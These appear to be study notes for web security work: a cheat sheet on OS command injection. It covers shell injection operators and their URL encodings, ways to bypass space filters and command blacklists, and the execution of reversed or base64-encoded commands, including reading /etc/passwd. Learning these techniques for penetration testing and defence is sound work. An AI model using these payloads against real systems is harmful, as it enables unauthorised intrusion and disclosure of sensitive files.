# Command Injection Notes

If some type of functionality is given with input we can enter try to abuse, like in the case of a website with a ping checker.

## Cheat sheets

Injection Operators
|Injection Operator|	Injection Character |	URL-Encoded Character 	|Executed Command|
|:----|:----|:----|:----|
|Semicolon |	; 	|%3b |	Both|
|New Line| 	\n |	%0a 	|Both|
|Background| 	& 	|%26 	|Both (second output generally shown first)|
|Pipe 	| 	%7c 	|Both |(only second output is shown)|
|AND 	|&& 	|%26%26 	|Both (only if first succeeds)|
|OR 	|\|\| |	%7c%7c| 	Second (only if first fails)|
|Sub-Shell |	`` 	|%60%60 	|Both (Linux-only)|
|Sub-Shell| 	$() 	|%24%28%29 	|Both (Linux-only)|

### Linux
|Code| 	Description|
|:----|:----|
|printenv 	|Can be used to view all environment variables|

### Spaces 	
|Code| 	Description|
|:----|:----|
|%09 	|Using tabs instead of spaces|
|${IFS} 	|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())|
|{ls,-la} 	|Commas will be replaced with spaces|

### Other Characters 	
|Code| 	Description|
|:----|:----|
|${PATH:0:1} |	Will be replaced with / |
|${LS_COLORS:10:1} 	|Will be replaced with ;|
|$(tr '!-}' '"-~'<<<[) 	|Shift character by one ([ -> \)|

### Blacklisted Command Bypass

### Character Insertion 	
|Code| 	Description|
|:----|:----|
|' or " 	|Total must be even|
|$@ or \ 	|Linux only|

### Case Manipulation 	
|Code| 	Description|
|:----|:----|
|$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") |	Execute command regardless of cases|
|$(a="WhOaMi";printf %s "${a,,}") 	|Another variation of the technique|

### Reversed Commands 	
|Code| 	Description|
|:----|:----|
|echo 'whoami' \| rev |	Reverse a string|
|$(rev<<<'imaohw') 	|Execute reversed command|

### Encoded Commands 	
|Code| 	Description|
|:----|:----|
|echo -n 'cat /etc/passwd \| grep 33' \| base64 	|Encode a string with base64|
|bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)| 	Execute b64 encoded string|
